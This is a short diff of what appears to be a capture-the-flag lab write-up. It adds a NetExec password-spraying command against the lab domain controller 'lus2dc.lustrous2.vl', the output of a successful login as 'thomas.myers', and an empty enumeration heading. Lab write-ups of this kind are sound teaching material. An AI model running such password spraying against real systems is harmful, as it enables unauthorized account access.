@@ -328,8 +328,17 @@ So looks like they are all valid.
 Going off the hint of weak passwords ill try ones relating to this box and maybe a year
 
 ```python
+nxc smb lus2dc.lustrous2.vl -u users.txt -p 'Lustrous2024' -k --continue-on-success
 
+...[SNIP]...
 
 SMB         lus2dc.lustrous2.vl 445    lus2dc           [+] lustrous2.vl\thomas.myers:Lustrous2024
 ```
 
+After trying several different combinations, i get a valid logon!
+
+# Enumeration of `thomas.myers`
+
+```python
+
+```
